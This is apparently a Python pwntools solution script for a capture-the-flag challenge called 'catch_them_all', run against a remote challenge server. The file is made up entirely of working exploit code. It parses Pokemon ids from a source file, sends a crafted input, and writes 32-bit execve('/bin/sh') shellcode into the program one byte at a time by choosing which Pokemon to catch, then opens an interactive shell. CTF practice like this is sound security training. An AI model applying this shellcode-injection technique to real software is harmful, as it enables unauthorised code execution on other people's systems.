from pwn import *
#io = process("./catch_them_all",aslr=True)
io = remote("0.cloud.chals.io",10898)

# setup pokemonList
pokemons = {}
with open("rev/setupPokemon.c") as src:
    lines = src.read().split("\n")
    for line in lines[31:-3:3]:
        startName = line.find('"')
        endName = line.rfind('"')
        pokemonName = line[startName+1:endName]

        comma = line.find(",")
        endBracket = line.find(")")
        pokemonId = line[comma+1:endBracket]
        if pokemonId[0] == "0":
            pokemonId = int(pokemonId,16)
        else:
            pokemonId = int(pokemonId)

        pokemons[pokemonId] = pokemonName


# desired shellcode
# https://shell-storm.org/shellcode/files/shellcode-811.html
shellcode =  b"\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += b"\xcd\x80\x31\xc0\x40\xcd\x80"


#gdb.attach(io,"break *0x5655662d")
io.sendline(b"A"*16 + b"\x07")

bytesWrote = 0

for i in shellcode:
    while True:
        io.recvuntil("searching for pokemon... found ")
        output = io.recvline().decode()
        exclamationIndex = output.find("!")
        currentPokemon = output[:exclamationIndex]
        if currentPokemon != pokemons[i]:
            io.sendlineafter("would you like to catch? y/n:","n")
        else:
            io.sendlineafter("would you like to catch? y/n:","y")

            io.recvline()
            if b"caught" in io.recvline():
                bytesWrote += 1
                print(bytesWrote)
                break



io.sendlineafter("would you like to catch? y/n:","f")
io.interactive()
